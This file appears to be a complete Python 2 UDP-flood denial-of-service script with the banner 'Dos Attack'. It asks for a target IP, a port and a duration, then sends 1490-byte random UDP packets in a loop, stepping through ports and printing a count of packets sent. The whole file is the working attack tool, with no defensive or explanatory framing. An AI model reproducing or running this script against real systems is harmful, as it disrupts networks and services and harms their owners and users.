import sys
import os
import time
import socket
import random

#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet Dos Attack")
print
print
print
ip = raw_input("IP Target : ")
port = input("Port       : ")
time1 = input("Number of second to sent: ")
time2 = int(time1)

os.system("clear")
os.system("figlet Attack Starting")
time.sleep(3)
T1 = datetime.now()
sent = 0
while True:
     T2 = datetime.now()
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     time_diff = T2-T1
     print ("Sent %s packet to %s throught port:%s"%(sent,ip,port))
     if port == 65534:
       port = 1
     if (time_diff.total_seconds()) > time2 :
        break;


